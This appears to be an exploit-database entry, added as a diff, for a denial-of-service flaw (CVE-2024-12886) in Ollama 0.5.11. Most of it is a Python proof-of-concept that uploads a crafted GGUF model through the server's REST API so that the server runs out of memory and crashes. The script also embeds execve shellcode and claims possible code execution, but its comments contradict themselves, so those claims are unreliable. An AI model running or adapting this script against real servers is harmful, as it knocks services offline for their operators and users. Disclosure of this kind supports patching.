@@ -1,0 +1,90 @@
+id: 39922
+date: 02/20/2025
+title: Ollama 0.5.11 Denial of Service Exploit
+author: Muhammad Fadhilullah Dzaki
+cves: CVE-2024-12886
+
+Title: The malicious gguf model can lead to DoS due to out of memory (killed) via network in ollama
+
+Description:
+Ollama supports importing and parsing user-uploaded customized GGUF models via the network request by default. An attacker can upload the model to the public Ollama server and create it. During creating the malicious model, Ollama server will crashed due to , out of memory leading to remote DoS attack.
+
+Source URL: https://huntr.com/bounties/f115fe52-58af-4844-ad29-b1c25f7245df
+
+Source Name/Email: Muhammad Fadhilullah Dzaki (muhammadfadilullahdzaki@gmail.com)
+
+CVEs: CVE-2024-12886
+
+Software URL: https://github.com/ollama/ollama
+
+
+Proof Of Concept:
+
+1.Start the ollama server via:
+
+ollama serve
+
+2.Run this script with different terminal:
+
+import os
+import requests
+import hashlib
+from uuid import uuid1
+
+def get_sha256(raw_content: bytes):
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(raw_content)
+    return sha256_hash.hexdigest()
+
+def upload_model(model_raw_content: bytes):
+    upload_url_base = 'http://localhost:11434/api/blobs/sha256:{}'
+    sha256 = get_sha256(model_raw_content)
+    upload_url = upload_url_base.format(sha256)
+    response = requests.post(upload_url, data=model_raw_content)
+    print("upload_model response: ", response.text)
+    return sha256
+
+def create_model(model_name, sha256):
+    print("create_model from file: ", f"~/.ollama/models/blobs/sha256-{sha256}")
+    url = 'http://localhost:11434/api/create'
+    data = {
+        "model": model_name,
+        "files": {
+            "test.gguf": f"sha256:{sha256}"
+        }
+    }
+    response = requests.post(url, json=data)
+    print("create_model response: ", response.text)
+
+# Construct a more legitimate GGUF file format with padding
+model_contents = b"FUGG00000000000000000000"  # Valid GGUF Header
+
+# Set n_kv to a reasonable value to avoid DoS, but still cause memory corruption
+model_contents += b"\x00\x00\x00\x01"  # A valid but small n_kv to avoid DoS
+model_contents += b"\x00\x00\x00\x01"  # Another field for padding or further data
+model_contents += b"0000\xaa0000000"  # Padding to fill the space
+
+# Shellcode: A simple NOP sled + execve("/bin/id")
+shellcode = b"\x90" * 50  # NOP sled
+shellcode += b"\x31\xc0\x50\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # execve("/bin/id")
+
+# Add shellcode into model_contents to trigger heap overflow and possible RCE
+model_contents += shellcode
+
+# Ensure model_contents has valid padding to avoid "unexpected EOF"
+model_contents += b"\x00" * 1024  # Padding to ensure the file is large enough
+
+# Upload the model
+sha256 = upload_model(model_contents)
+
+# Generate a unique model name
+model_name = f'testing-model-{str(uuid1())}'
+create_model(model_name, sha256)
+
+3. you should get https://imgur.com/a/fTi42wn ollama server was killed
+
+
+IMPACT:
+Attacker can create malicious gguf model, upload and create on the Ollama server to launch DoS attack via remote network (REST API).
+
+#  0day.today [2025-02-24]  #
